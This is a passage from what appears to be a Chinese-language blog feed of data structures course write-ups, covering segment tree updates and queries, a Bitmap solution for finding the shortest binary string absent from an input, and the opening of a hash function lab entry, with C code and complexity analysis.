y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mid <span class="token operator">&lt;</span> y<span class="token punctuation">)</span> <span class="token function">do_add</span><span class="token punctuation">(</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> tree<span class="token punctuation">[</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>若 <code>add</code> 区间与子树区间不交, 直接返回;</li><li>若子树区间包含在 <code>add</code> 区间内, 直接更新当前子树的和与懒惰标记;</li><li>若子树区间与 <code>add</code> 区间相交, 那么向下递归: 若当前懒惰标记非零, 先进行懒惰标记的下放. 然后分别更新左子树 <code>tree[left_son(k)]</code> 与右子树 <code>tree[right_son(k)]</code> 的和, 最后用左右子树的和更新本身的和 <code>tree[k]</code>.</li></ul><h4 id="查询操作"><a href="#查询操作" class="headerlink" title="查询操作"></a>查询操作</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 66</span>ll <span class="token function">do_query</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&gt;</span> r <span class="token operator">||</span> y <span class="token operator">&lt;</span> l<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> l <span class="token operator">&amp;&amp;</span> y <span class="token operator">&gt;=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>         <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        ll sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>label<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">push_down</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> sum <span class="token operator">=</span> <span class="token function">do_query</span><span class="token punctuation">(</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mid <span class="token operator">&lt;</span> y<span class="token punctuation">)</span> sum <span class="token operator">+=</span> <span class="token function">do_query</span><span class="token punctuation">(</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> sum<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>do_add()</code> 与 <code>do_query()</code> 在逻辑上完全相同.</p><ul><li>若 <code>query</code> 区间与子树区间不交, 直接返回;</li><li>若子树区间包含在 <code>query</code> 区间内, 直接返回当前子树的和;</li><li>若子树区间与 <code>query</code> 区间相交, 那么向下递归: 若当前懒惰标记非零, 先进行懒惰标记的下放. 然后分别查询左子树 <code>tree[left_son(k)]</code> 与右子树 <code>tree[right_son(k)]</code> 的和, 最后用左右子树的和更新本身的和 <code>tree[k]</code>.</li></ul><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>读入数据后对端点使用 <code>qsort()</code> 进行排序, 时间复杂度为 $O(mlogm)$;</p><p>对排序后的有序数组进行去重, 时间复杂度为 $O(m)$;</p><p>每次 <code>do_add()</code> 操作与 <code>do_query()</code> 操作实际上是对整树的一次扫描, 时间复杂度正比于树高 $O(logm)$, $m$ 次操作的整体时间复杂度仍为 $O(mlog(m)).</p><p>综上, 算法总体时间复杂度为 $O(mlog(m))$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>本体空间复杂度取决于操作数 <code>m</code> 带来的离散化后的端点数 <code>k</code>, 题解中使用 <code>tree[]</code> 与 <code>label[]</code> 数组模拟了一棵 <code>Segment Tree</code>, 整体需要的空间最坏情况仍为 $O(m)$.</p><p>本题中直接开辟了相关大小的数组存储信息,</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 6</span><span class="token keyword">const</span> <span class="token keyword">int</span> MAX <span class="token operator">=</span> <span class="token number">2e5</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 9</span>ll tree<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 使用 tree[] 来模拟一棵线段树.</span>ll label<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 懒惰标记.</span>ll arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 对离散化的线段端点序列进行排序与去重.</span>ll operations<span class="token punctuation">[</span>MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 记录操作序列.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>空间消耗最坏情况约为: $(16 + 16 + 2 + 3)\times 2\times 10^5 \times 8B = 56MB$, 在题目要求范围内.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Not Found</title>
      <link href="/27/"/>
      <url>/27/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA3"><a href="#CST-PA3" class="headerlink" title="CST PA3"></a>CST PA3</h1><h2 id="3-2-Not-Found"><a href="#3-2-Not-Found" class="headerlink" title="3-2 Not Found"></a>3-2 Not Found</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>注意到 $A$ 的输入长度范围为 $[1, 2^{24}]$, 而可由 $A$ 产生的所有长度为 $n$ 的子串数为 $\vert A\vert - n + 1$. 一个长度为 $n$ 的字符串共有 $2^n$ 种可能, 当 $n  = 24$ 时, 由 $\vert A\vert - 24 + 1 &lt; 2^{24}$, $A$ 中已经无法包含所有长度为 $24$ 的子串, 因此第一个未在 $A$ 中出现的子串必是长度不超过 $24$ 的子串.</p><p>考虑枚举所有长度为 $k$ 的子串, 其中 $k \le \min(\vert A\vert, 24)$. 对于 $A$ 中长度为 $k$ 的所有子串, 我们依据其二进制值进行标记. 由于数据范围过大, 且实际上需储存的只是串的存在性, 因此考虑使用 <code>Bitmap</code> 对子串情况进行存储.</p><h4 id="class-Bitmap"><a href="#class-Bitmap" class="headerlink" title="class Bitmap"></a>class Bitmap</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 6</span><span class="token comment">// 实现一个 Bitmap 类存储 01 字符串.</span>class Bitmap <span class="token punctuation">{</span>public<span class="token operator">:</span>    <span class="token comment">// 所存放的空间 M[], 容量为 N * sizeof(char) * 8 bit.</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> M<span class="token punctuation">;</span>    <span class="token keyword">int</span> N<span class="token punctuation">;</span>      <span class="token comment">// 初始化 Bitmap, 置 0.</span>    <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        N <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span>        M <span class="token operator">=</span> new <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>M<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 构造函数.</span>    <span class="token function">Bitmap</span><span class="token punctuation">(</span><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">init</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token comment">// 设置 Bitmap 第 k 位为 1.</span>    <span class="token keyword">void</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span> M<span class="token punctuation">[</span>k <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>k <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token comment">// 清除 Bitmap 第 k 位.</span>    <span class="token keyword">void</span> <span class="token function">clear</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span> M<span class="token punctuation">[</span>k <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&amp;=</span> <span class="token operator">~</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>k <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token comment">// 检测 Bitmap 第 k 位是否为 1.</span>    bool <span class="token function">test</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> M<span class="token punctuation">[</span>k <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>k <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token comment">// 清零 Bitmap. </span>    <span class="token keyword">void</span> <span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">memset</span><span class="token punctuation">(</span>M<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="void-read-input"><a href="#void-read-input" class="headerlink" title="void read_input()"></a>void read_input()</h4><p>在读入初始字符串时, 设置 <code>Bitmap* str</code>, 若初始字符串第 $k$ 位为 $1$, 则使用 <code>str-&gt;set[k]</code> 修改 <code>Bitmap</code> 的内容. 将输入字符串从左到右读入 <code>Bitmap* str</code>, 此时 <code>Bitmap* str</code> 存放了一个 $01$ 字符串.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 32</span><span class="token keyword">void</span> <span class="token function">read_input</span><span class="token punctuation">(</span>Bitmap<span class="token operator">*</span> str<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">&amp;</span> input<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>input <span class="token operator">!=</span> <span class="token char">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        input <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>input <span class="token operator">==</span> <span class="token char">'1'</span><span class="token punctuation">)</span>             str<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>        len<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="int-read"><a href="#int-read" class="headerlink" title="int read()"></a>int read()</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 42</span><span class="token keyword">int</span> <span class="token function">read</span><span class="token punctuation">(</span>Bitmap<span class="token operator">*</span> bitmap<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">,</span> <span class="token keyword">int</span> read_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> read_len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        tmp <span class="token operator">=</span> bitmap<span class="token operator">-&gt;</span><span class="token function">test</span><span class="token punctuation">(</span>pos <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>tmp <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">:</span> tmp <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>read()</code> 从 <code>Bitmap* str</code> 第 <code>pos</code> 位开始读取为长 <code>read_len</code> 的二进制串, 并将其转换为十进制数. 为了节省遍历子串的时间, 首先考虑 $k = \min(\vert A\vert, 24)$ 的情形.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 113</span><span class="token keyword">int</span> k <span class="token operator">=</span> search_len<span class="token punctuation">;</span>Bitmap<span class="token operator">*</span> a <span class="token operator">=</span> new <span class="token function">Bitmap</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> search_len<span class="token punctuation">)</span><span class="token punctuation">;</span>Bitmap<span class="token operator">*</span> b <span class="token operator">=</span> new <span class="token function">Bitmap</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>search_len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Bitmap* a</code> 用于存储所有长 $k$ 位的 $01$ 串在原字符串中的出现情况, 若 <code>a-&gt;test(i) == true</code>, 则输入串中存在十进制值为 $i$ 的 $k$ 位 $01$ 二进制串. <code>Bitmap* b</code> 用于存储所有长 $k - 1$ 位的 $01$ 串在原字符串中的出现情况, 若 <code>b-&gt;test(j) == true</code>, 则输入串中存在十进制值为 $j$ 的 $k - 1$ 位 $01$ 二进制串.</p><p>从 <code>Bitmap* str</code> 的末尾开始向头部遍历, 对于当前处理的二进制串的十进制值 $s = \overline{a_{m + 1}a_{m + 2}\cdots a_{m + k}}<em>2$, 下一个处理串的十进制值 $s’ = \overline{a_ma</em>{m + 1}\cdots a_{m + k - 1}}_2 = a\gg 1 + a_m\ll (k - 1)$.</p><p>从后向前遍历, 节省了将二进制串转换为十进制串的时间.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 118</span><span class="token keyword">int</span> pos <span class="token operator">=</span> len <span class="token operator">-</span> k<span class="token punctuation">;</span><span class="token keyword">int</span> get <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> pos<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>get<span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>get <span class="token operator">&gt;&gt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>pos <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token operator">-&gt;</span><span class="token function">test</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">)</span>        get <span class="token operator">+=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>get<span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>get <span class="token operator">&gt;&gt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">set_end</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> b<span class="token punctuation">,</span> len <span class="token operator">-</span> k<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为此, 首先读入 <code>str</code> 末端的 $k$ 长子串 <code>get</code>, 调用 <code>a-&gt;set(get)</code> 将其存储在 <code>Bitmap* a</code> 中, 并使用一个 <code>while</code> 循环遍历接下来所有 $k$ 长子串.</p><h4 id="void-set-end"><a href="#void-set-end" class="headerlink" title="void set_end()"></a>void set_end()</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 68</span><span class="token keyword">void</span> <span class="token function">set_end</span> <span class="token punctuation">(</span>Bitmap<span class="token operator">*</span> str<span class="token punctuation">,</span> Bitmap<span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    a<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> pos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>调用 <code>set_end()</code> 将 <code>str</code> 末尾的 $k - 1$ 位 $01$ 子串加入 <code>Bitmap* b</code>.</p><p>考虑到长度为 $k - 1$ 的子串. 对于所有 $k$ 长子串的十进制值 $S_1, S_2, \cdots, S_{\vert A\vert - k + 1}$, 长度为 $k - 1$ 的子串恰为所有 $k$ 长子串删去最后一位, 再补上 <code>str</code> 中末端的 $k - 1$ 长子串, 其十进制值 $R_1 = S_1\gg 1, R_2 = S_2\gg 1, \cdots, R_{\vert A\vert - k + 1} = S_{\vert A\vert - k + 1}\gg 1, R_{\vert A\vert - k + 2}$, 其中 $R_{\vert A\vert - k + 2}$ 调用 <code>set_end(str, b, len - k, k)</code> 来设置.</p><p>接下来调用 <code>check_full(b, k)</code> 检查 <code>Bitmap* b</code> 中是否已经存储了所有 $k - 1$ 长子串.</p><h4 id="void-get-ans"><a href="#void-get-ans" class="headerlink" title="void get_ans()"></a>void get_ans()</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 82</span><span class="token keyword">void</span> <span class="token function">get_ans</span> <span class="token punctuation">(</span>Bitmap<span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> output<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> precision<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>a<span class="token operator">-&gt;</span><span class="token function">test</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            output <span class="token operator">=</span> i<span class="token punctuation">;</span>            precision <span class="token operator">=</span> k<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若所有 $k - 1$ 长子串都已经存储在了 <code>Bitmap* b</code> 中, 那么说明 <code>str</code> 中首个未出现的字符串长度为 $k$, 只需调用 <code>get_ans(a, k, output, precision)</code> 在 <code>Bitmap* a</code> 中遍历寻找首个未出现的 $k$ 长子串, 并调用 <code>show_ans(output, precision)</code> 输出在原串中未出现的最短且字典序最小的 $k$ 长子串即可.</p><h4 id="void-trans"><a href="#void-trans" class="headerlink" title="void trans()"></a>void trans()</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 54</span><span class="token keyword">void</span> <span class="token function">trans</span> <span class="token punctuation">(</span>Bitmap<span class="token operator">*</span> a<span class="token punctuation">,</span> Bitmap<span class="token operator">*</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">-&gt;</span><span class="token function">test</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            b<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>否则, 若存在 $k - 1$ 长子串未存储在 <code>Bitmap* b</code> 中, 那么调用 <code>copy(a, b)</code> 将 <code>Bitmap* b</code> 的值赋给 <code>Bitmap* a</code>, <code>k</code> 自减, 并调用 <code>b-&gt;clean()</code> 将 <code>Bitmap* b</code> 置零. 此时 <code>Bitmap* a</code> 存储了所有 $k$ 长子串, 并调用 <code>trans(a, b, k)</code> 利用其中值更新 <code>Bitmap* b</code> 中的 $k - 1$ 长子串, 仍然需要使用 <code>set_end(str, b, len - k, k)</code> 将 <code>str</code> 末端的子串加入 <code>b</code>.</p><p>当遍历到长度为 $k - 1$ 的串全部存在, 而 $k$ 长子串存在缺失时, 将 $k$ 长子串所缺少十进制值对应的首个 $01$ 子串输出.</p><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>第一次读入串 <code>str</code> 的时间复杂度为 $O(\vert A\vert)$;</p><p>对于子串的处理考虑极端情况, 对 $k$ 长子串存储、遍历枚举、更新所需要时间为 $O(2^k)$, 若从长 $24$ 子串遍历至长 $1$ 子串, 消耗时间为 $O(2^{25})$.</p><p>综上, 算法最坏时间复杂度为 $O(\vert A\vert + 2^{25})$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>空间复杂度主要来自于使用了 <code>Bitmap</code> 存储目的串的过程.</p><p>最坏情况下开辟了两个可存储 $2^{24}$ <code>bit</code>, 一个可存储 $2^{23}$ <code>bit</code> 的 <code>Bitmap</code>, 最坏情况空间复杂度为: $(2\times 2^{24} + 2^{23}) bit = 5\times 2^{20} B = 5MB$, 在题目要求范围内.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HashFun</title>
      <link href="/26/"/>
      <url>/26/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-LAB2"><a href="#CST-LAB2" class="headerlink" title="CST LAB2"></a>CST LAB2</h1><h2 id="HashFun"><a href="#HashFun" class="headerlink" title="HashFun"></a>HashFun</h2><h3 id="策略实现-396字"><a href="#策略实现-396字" class="headerlink" title="策略实现 (396字)"></a>策略实现 (396字)</h3><h4 id="good-hashing"><a href="#good-hashing" class="headerlink" title="good_hashing"></a><code>good_hashing</code></h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> good_hashing<span class="token operator">::</span><span class="token function">operator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">,</span> <span class="token keyword">int</span> N<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> seed <span class="token operator">=</span> <span class="token number">131</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token number">0</span><span class="token 